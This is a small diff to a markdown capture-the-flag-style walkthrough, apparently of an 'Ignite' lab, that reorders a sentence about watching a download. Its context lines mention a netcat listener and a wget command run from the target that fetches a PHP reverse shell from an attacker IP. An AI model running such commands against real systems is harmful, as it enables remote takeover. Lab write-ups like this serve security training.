@@ -254,13 +254,15 @@ Start a netcat listener in the other pane, using the port in the reverse shell.
 
 ![reverse shell setup](assets/ignite-31.png)  
 
-From the target device, use wget to download the reverse shell from the attacking device   
+From the target device, use wget to download the reverse shell from the attacking device  
 
 `:> wget -O myRevShell.php 10.6.15.233:4445/prs.php`  
 
+and observe the download from the attacking device  
+
 ![Download](assets/ignite-32.png)  
 
-and observe the download from the attacking device  
+ 
 
 ![Download Server](assets/ignite-33.png)
 
